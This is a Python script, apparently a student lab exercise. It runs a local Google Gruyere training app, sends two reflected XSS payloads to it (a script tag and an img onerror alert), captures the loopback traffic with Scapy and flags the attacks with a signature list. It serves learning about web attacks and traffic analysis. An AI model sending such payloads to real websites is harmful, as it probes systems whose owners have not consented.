#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import gzip
import urllib.parse
import argparse
import subprocess
import threading
from typing import List, Dict, Any, Optional, Tuple

from scapy.all import (
    sniff,
    wrpcap,
    rdpcap,
    conf,
    Packet,
    TCP,
    IP
)
import requests

DEFAULT_GRUYERE_HOST = "localhost"
DEFAULT_GRUYERE_PORT = 8008
DEFAULT_PCAP_FILE = "captured_traffic.pcap"
DEFAULT_INTERFACE = r"\Device\NPF_Loopback"


# =====================================================================
# Модуль 1: Взаимодействие с веб-приложением и отправка XSS-нагрузок
# =====================================================================

def get_gruyere_unique_id(base_url: str) -> str:
    try:
        resp = requests.get(base_url, timeout=5, allow_redirects=False)
        location = resp.headers.get("Location", "")
        parts = location.strip("/").split("/")
        if parts and parts[0]:
            return parts[0]
    except Exception as e:
        print(f"[-] Ошибка при определении unique_id: {e}")
    return ""


def generate_traffic(base_url: str, unique_id: str) -> Dict[str, Any]:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Scapy-HW8-Client",
        "Accept-Encoding": "gzip, deflate"
    })

    results = {
        "normal_requests": [],
        "xss_requests": []
    }

    prefix = f"{base_url}/{unique_id}" if unique_id else base_url
    print(f"\n[*] Подключение к Gruyere: {prefix}")

    print("\n--- Генерация легитимного HTTP-трафика ---")
    try:
        print("[+] GET /: Главная страница...")
        r_home = session.get(f"{prefix}/", timeout=5)
        results["normal_requests"].append({
            "name": "Home Page",
            "method": "GET",
            "url": r_home.url,
            "status": r_home.status_code,
            "length": len(r_home.content)
        })
        time.sleep(0.7)

        print("[+] GET /snippets.gtl: Список сниппетов...")
        r_snip = session.get(f"{prefix}/snippets.gtl", timeout=5)
        results["normal_requests"].append({
            "name": "View Snippets",
            "method": "GET",
            "url": r_snip.url,
            "status": r_snip.status_code,
            "length": len(r_snip.content)
        })
        time.sleep(0.7)

    except Exception as e:
        print(f"[-] Ошибка при отправке легитимных запросов: {e}")

    print("\n--- Эксплуатация XSS-уязвимостей ---")
    
    reflected_payload = "<script>alert('XSS-Reflected-HSE')</script>"
    encoded_payload = urllib.parse.quote(reflected_payload)
    xss_reflected_url = f"{prefix}/{encoded_payload}"
    
    print(f"[!] Эксплуатация Reflected XSS: GET {xss_reflected_url}")
    print(f"    Payload: {reflected_payload}")
    try:
        r_ref = session.get(xss_reflected_url, timeout=5)
        is_ref = reflected_payload in r_ref.text
        results["xss_requests"].append({
            "type": "Reflected XSS",
            "method": "GET",
            "payload": reflected_payload,
            "url": r_ref.url,
            "status": r_ref.status_code,
            "reflected": is_ref
        })
        print(f"    [+] Статус ответа: {r_ref.status_code}")
        print(f"    [+] Отражение нагрузки: {'ДА (УСПЕШНО)' if is_ref else 'НЕТ'}")
        time.sleep(0.7)
    except Exception as e:
        print(f"[-] Ошибка при отправке Reflected XSS: {e}")

    img_payload = "<img src='invalid-image.jpg' onerror='alert(\"XSS-Img-HSE\")'>"
    encoded_img = urllib.parse.quote(img_payload)
    xss_img_url = f"{prefix}/{encoded_img}"
    print(f"\n[!] Эксплуатация Reflected XSS (Img tag): GET {xss_img_url}")
    print(f"    Payload: {img_payload}")
    try:
        r_img = session.get(xss_img_url, timeout=5)
        is_img_ref = img_payload in r_img.text
        results["xss_requests"].append({
            "type": "Reflected XSS (IMG)",
            "method": "GET",
            "payload": img_payload,
            "url": r_img.url,
            "status": r_img.status_code,
            "reflected": is_img_ref
        })
        print(f"    [+] Статус ответа: {r_img.status_code}")
        print(f"    [+] Отражение нагрузки: {'ДА (УСПЕШНО)' if is_img_ref else 'НЕТ'}")
        time.sleep(0.7)
    except Exception as e:
        print(f"[-] Ошибка при отправке Img XSS: {e}")

    return results


# =====================================================================
# Модуль 2: Перехват сетевого трафика через Scapy
# =====================================================================

def find_loopback_interface() -> str:
    for iface in conf.ifaces.values():
        name = getattr(iface, "name", "")
        desc = getattr(iface, "description", "")
        if "loopback" in name.lower() or "loopback" in desc.lower():
            return name
    return DEFAULT_INTERFACE


def capture_traffic(
    pcap_filename: str,
    port: int = DEFAULT_GRUYERE_PORT,
    duration: int = 15,
    interface: Optional[str] = None
) -> List[Packet]:
    if not interface:
        interface = find_loopback_interface()

    bpf_filter = f"tcp port {port}"
    print(f"\n[*] Инициализация захвата сетевых пакетов Scapy:")
    print(f"    Интерфейс: {interface}")
    print(f"    BPF-фильтр: {bpf_filter}")
    print(f"    Таймаут захвата: {duration} сек...")

    packets = sniff(iface=interface, filter=bpf_filter, timeout=duration)
    print(f"[+] Захват завершен. Перехвачено пакетов: {len(packets)}")

    if packets:
        wrpcap(pcap_filename, packets)
        print(f"[+] Дамп сохранен в: {pcap_filename}")
    else:
        print("[-] Предупреждение: Пакетов не перехвачено.")

    return packets


# =====================================================================
# Модуль 3: Парсинг, декомпрессия gzip и анализ трафика из .pcap
# =====================================================================

def parse_http_stream(raw_data: bytes) -> Optional[Dict[str, Any]]:
    if not raw_data:
        return None

    delimiter = b"\r\n\r\n"
    if delimiter not in raw_data:
        header_part = raw_data
        body_part = b""
    else:
        header_part, body_part = raw_data.split(delimiter, 1)

    try:
        header_text = header_part.decode("iso-8859-1")
    except Exception:
        header_text = header_part.decode("utf-8", errors="ignore")

    lines = header_text.split("\r\n")
    start_line = lines[0] if lines else ""

    headers = {}
    for line in lines[1:]:
        if ": " in line:
            k, v = line.split(": ", 1)
            headers[k.strip().lower()] = v.strip()

    decompressed_body = body_part
    if "gzip" in headers.get("content-encoding", "").lower() and body_part:
        try:
            decompressed_body = gzip.decompress(body_part)
        except Exception:
            pass

    try:
        body_text = decompressed_body.decode("utf-8", errors="replace")
    except Exception:
        body_text = decompressed_body.decode("iso-8859-1", errors="replace")

    return {
        "start_line": start_line,
        "headers": headers,
        "body_raw": decompressed_body,
        "body_text": body_text
    }


def analyze_pcap(pcap_filename: str) -> Dict[str, Any]:
    if not os.path.exists(pcap_filename):
        print(f"[-] Файл дампа не найден: {pcap_filename}")
        return {}

    print(f"\n=======================================================")
    print(f"[*] Анализ сетевого дампа: {pcap_filename}")
    print(f"=======================================================")

    packets = rdpcap(pcap_filename)
    print(f"[+] Загружено пакетов: {len(packets)}")

    flows: Dict[Tuple[int, int], Dict[str, Any]] = {}

    for idx, pkt in enumerate(packets):
        if pkt.haslayer(TCP) and hasattr(pkt[TCP], "payload") and len(pkt[TCP].payload) > 0:
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            payload = bytes(pkt[TCP].payload)

            flow_key = (min(sport, dport), max(sport, dport))
            if flow_key not in flows:
                flows[flow_key] = {
                    "client_port": max(sport, dport),
                    "server_port": min(sport, dport),
                    "req_bytes": b"",
                    "resp_bytes": b"",
                    "start_packet": idx + 1
                }

            if sport == DEFAULT_GRUYERE_PORT:
                flows[flow_key]["resp_bytes"] += payload
            else:
                flows[flow_key]["req_bytes"] += payload

    print(f"[+] Восстановлено TCP HTTP-сессий: {len(flows)}")

    xss_signatures = [
        "alert(",
        "<script>",
        "onerror=",
        "XSS-Reflected-HSE",
        "XSS-Img-HSE"
    ]

    transactions = []

    for flow_key, flow_data in flows.items():
        req = parse_http_stream(flow_data["req_bytes"])
        resp = parse_http_stream(flow_data["resp_bytes"])

        if req and req["start_line"]:
            is_xss_req = any(sig.lower() in req["start_line"].lower() or sig.lower() in req["body_text"].lower() for sig in xss_signatures)
            is_xss_resp = False
            if resp and resp["body_text"]:
                is_xss_resp = any(sig.lower() in resp["body_text"].lower() for sig in xss_signatures)

            transactions.append({
                "client_port": flow_data["client_port"],
                "start_packet": flow_data["start_packet"],
                "req": req,
                "resp": resp,
                "is_xss_req": is_xss_req,
                "is_xss_resp": is_xss_resp
            })

    print(f"\n--- Детальный разбор HTTP-транзакций ---")
    for idx, t in enumerate(transactions, 1):
        tag = "[XSS АТАКА]" if (t["is_xss_req"] or t["is_xss_resp"]) else "[ЛЕГИТИМНЫЙ]"
        req = t["req"]
        resp = t["resp"]

        print(f"\n{tag} Транзакция #{idx} (Порт {t['client_port']}, пакет ~{t['start_packet']}):")
        print(f"  --> Запрос: {req['start_line']}")
        print(f"      Host: {req['headers'].get('host', 'N/A')}")
        
        if t["is_xss_req"]:
            decoded_url = urllib.parse.unquote(req['start_line'])
            print(f"      [!] XSS-пейлоад в запросе: {decoded_url}")

        if resp and resp["start_line"]:
            c_len = resp["headers"].get("content-length", len(resp["body_text"]))
            c_enc = resp["headers"].get("content-encoding", "identity")
            c_type = resp["headers"].get("content-type", "N/A")
            x_xss = resp["headers"].get("x-xss-protection", "не задан")

            print(f"  <-- Ответ : {resp['start_line']}")
            print(f"      Размер: {c_len} байт (тело: {len(resp['body_text'])} симв.)")
            print(f"      Сжатие: {c_enc}")
            print(f"      Тип   : {c_type}")
            print(f"      X-XSS-Protection: {x_xss}")

            if t["is_xss_resp"]:
                print(f"      [!] XSS-пейлоад ОТРАЖЕН в ответе!")
                body = resp["body_text"]
                for sig in xss_signatures:
                    if sig.lower() in body.lower():
                        pos = body.lower().find(sig.lower())
                        start_ctx = max(0, pos - 30)
                        end_ctx = min(len(body), pos + 70)
                        snippet = body[start_ctx:end_ctx].replace("\n", " ").replace("\r", "")
                        print(f"      [!] Фрагмент: ... {snippet} ...")
                        if "<script" in snippet.lower():
                            print(f"      [!] Место: блок <div class='message'> (тег <script>)")
                        elif "onerror=" in snippet.lower():
                            print(f"      [!] Место: атрибут тега <img> (onerror)")

    print(f"\n=======================================================")
    print(f"[*] Сравнительный анализ: Обычный трафик vs XSS-атака")
    print(f"=======================================================")

    normal_tx = [t for t in transactions if not t["is_xss_req"]]
    xss_tx = [t for t in transactions if t["is_xss_req"]]

    print(f"\n1. Количество сессий:")
    print(f"   - Легитимных: {len(normal_tx)}")
    print(f"   - Атакующих : {len(xss_tx)}")

    if normal_tx:
        avg_normal_size = sum(len(t["resp"]["body_text"]) for t in normal_tx if t["resp"]) / len(normal_tx)
        print(f"\n2. Легитимный трафик:")
        print(f"   - Средний размер ответа: {avg_normal_size:.1f} байт")
        print(f"   - Статусы ответов     : {list(set(t['resp']['start_line'] for t in normal_tx if t['resp']))}")

    if xss_tx:
        avg_xss_size = sum(len(t["resp"]["body_text"]) for t in xss_tx if t["resp"]) / len(xss_tx)
        print(f"\n3. Трафик при XSS:")
        print(f"   - Средний размер ответа: {avg_xss_size:.1f} байт")
        print(f"   - Статусы ответов     : {list(set(t['resp']['start_line'] for t in xss_tx if t['resp']))}")
        print(f"   - Экранирование        : Отсутствует (символы '<', '>', quotes переданы открыто)")
        print(f"   - X-XSS-Protection     : {xss_tx[0]['resp']['headers'].get('x-xss-protection', 'не задан')}")

    return {
        "total_packets": len(packets),
        "total_transactions": len(transactions),
        "normal_count": len(normal_tx),
        "xss_count": len(xss_tx)
    }


# =====================================================================
# Модуль 4: Управление запуском и аргументы командной строки
# =====================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Scapy HTTP Sniffer & XSS Traffic Analyzer"
    )
    parser.add_argument(
        "--mode",
        choices=["all", "sniff", "attack", "analyze"],
        default="all",
        help="Режим работы: 'all', 'sniff', 'attack', 'analyze'"
    )
    parser.add_argument(
        "--pcap",
        default=DEFAULT_PCAP_FILE,
        help=f"Путь к файлу .pcap (по умолчанию: {DEFAULT_PCAP_FILE})"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_GRUYERE_PORT,
        help=f"TCP порт Gruyere (по умолчанию: {DEFAULT_GRUYERE_PORT})"
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=15,
        help="Продолжительность захвата в секундах (по умолчанию: 15)"
    )
    parser.add_argument(
        "--iface",
        default=None,
        help="Имя сетевого интерфейса Scapy"
    )

    args = parser.parse_args()

    base_url = f"http://{DEFAULT_GRUYERE_HOST}:{args.port}"

    if args.mode == "analyze":
        analyze_pcap(args.pcap)
        return

    if args.mode == "attack":
        uid = get_gruyere_unique_id(base_url)
        generate_traffic(base_url, uid)
        return

    if args.mode == "sniff":
        capture_traffic(args.pcap, port=args.port, duration=args.duration, interface=args.iface)
        return

    if args.mode == "all":
        print("==================================================================")
        print("   ЗАПУСК ПОЛНОГО КОМПЛЕКСНОГО ЦИКЛА (SNIFF + ATTACK + ANALYZE)  ")
        print("==================================================================")

        gruyere_proc = None
        try:
            r_check = requests.get(base_url, timeout=1)
            print(f"[+] Сервер Google Gruyere уже запущен на {base_url}")
        except Exception:
            print(f"[*] Сервер Google Gruyere не обнаружен. Запускаем локальный инстанс...")
            gruyere_script = os.path.join(os.path.dirname(__file__), "gruyere_app", "gruyere.py")
            if os.path.exists(gruyere_script):
                gruyere_proc = subprocess.Popen(
                    [sys.executable, "gruyere.py"],
                    cwd=os.path.join(os.path.dirname(__file__), "gruyere_app"),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                time.sleep(2)
                print(f"[+] Сервер Google Gruyere успешно запущен (PID: {gruyere_proc.pid})")
            else:
                print(f"[-] Не найден скрипт gruyere.py по пути {gruyere_script}")
                return

        uid = get_gruyere_unique_id(base_url)
        print(f"[+] Идентификатор инстанса Gruyere: {uid}")

        captured_packets = []
        stop_event = threading.Event()

        def sniffer_worker():
            iface = args.iface or find_loopback_interface()
            bpf = f"tcp port {args.port}"
            pkts = sniff(
                iface=iface,
                filter=bpf,
                timeout=args.duration,
                stop_filter=lambda p: stop_event.is_set()
            )
            captured_packets.extend(pkts)
            if pkts:
                wrpcap(args.pcap, pkts)

        t_sniff = threading.Thread(target=sniffer_worker)
        t_sniff.start()
        print(f"[*] Сниффер Scapy запущен на интерфейсе (таймаут: {args.duration} сек)...")

        time.sleep(1.5)

        generate_traffic(base_url, uid)

        time.sleep(1.0)
        stop_event.set()

        t_sniff.join(timeout=5)
        print(f"[+] Сниффер завершил работу. Захвачено пакетов: {len(captured_packets)}")

        if gruyere_proc:
            gruyere_proc.terminate()
            print("[+] Локальный сервер Google Gruyere корректно остановлен.")

        analyze_pcap(args.pcap)


if __name__ == "__main__":
    main()
